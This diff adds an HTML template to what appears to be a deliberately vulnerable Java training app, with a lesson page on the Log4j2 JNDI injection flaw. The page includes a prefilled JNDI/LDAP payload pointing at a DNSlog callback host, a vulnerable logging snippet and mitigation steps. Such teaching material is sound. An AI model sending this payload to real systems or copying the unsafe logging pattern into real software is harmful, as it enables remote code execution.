@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{commons/commons::head}"></div>
+
+<body>
+<!-- 顶部导航栏 -->
+<div th:replace="~{commons/commons::topbar}"></div>
+
+<div class="container-fluid">
+    <div class="row">
+        <!-- 侧边栏 -->
+        <div th:replace="~{commons/commons::siderbar(active='log4j.html')}"></div>
+
+        <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
+            <div class="vul_header">
+                <span>组件漏洞 - Log4j2反序列化</span>
+            </div>
+            <hr>
+            <ul class="nav nav-tabs">
+                <li class="nav-item">
+                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
+                </li>
+            </ul>
+
+            <div class="tab-content">
+                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
+                    Apache Log4j2是一款优秀的Java日志框架。此次漏洞是由 Log4j2 提供的lookup功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在处理数据时，并未对输入（如${jndi）进行严格的判断，从而造成JNDI注入
+                </div>
+                <div class="tab-pane fade" id="bb">
+                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder" style="height: 110px;">
+【对于第三方依赖组件，需要及时更新版本
+                    </textarea>
+                </div>
+            </div>
+
+            <hr>
+
+            <div class="box-float">
+                <div class="float1">
+                    <h5><span class="lnr lnr-bug"> 漏洞代码</span></h5>
+                    <form role="search" th:action="@{/Log4j/vul}" method="post">
+                        <div class="input-group mb-3">
+                            <input type="text" class="form-control" name="q" value="${jndi:ldap://vul.s8egdg.dnslog.cn/test}" style="color: #b5babb">
+                            <div class="input-group-append">
+                                <button class="btn btn-sm btn-danger" type="submit">搜索</button>
+                            </div>
+                        </div>
+                    </form>
+
+                    <textarea class="form-control" id="code1">
+// log4j-core < 2.15.0-rc1
+
+public String vul(String content) {
+    logger.error(content);
+    return "Log4j2 RCE";
+}
+                    </textarea>
+
+                </div>
+
+                <div class="float2">
+
+                    <h5><span class="lnr lnr-smile"> 安全配置</span></h5>
+                    <textarea class="form-control" id="code2">
+方案一、升级版本
+    升级Apache Log4j所有相关应用到>= Log4j-2.15.0官方稳定版本
+方案二、临时缓解（选其一）
+    ● 版本>=2.10.0， 修改jvm参数，添加-Dlog4j2.formatMsgNoLookups=true
+    ● 版本>=2.10.0， 代码中配置System.setProperty("log4j2.formatMsgNoLookups", "true")，重新打包jar包
+    ● 版本>=2.10.0， 修改配置文件log4j2.component.properties ：log4j2.formatMsgNoLookups=True
+    注意：临时缓解对Log4j <= 2.9版本是无效的，因为在2.10版本之前并没有引入这些变量来控制 lookup()。
+                    </textarea>
+                </div>
+
+            </div>
+        </main>
+    </div>
+</div>
+
+<!-- 引入script -->
+<div th:replace="~{commons/commons::script}"></div>
+
+
+</body>
+
+</html>
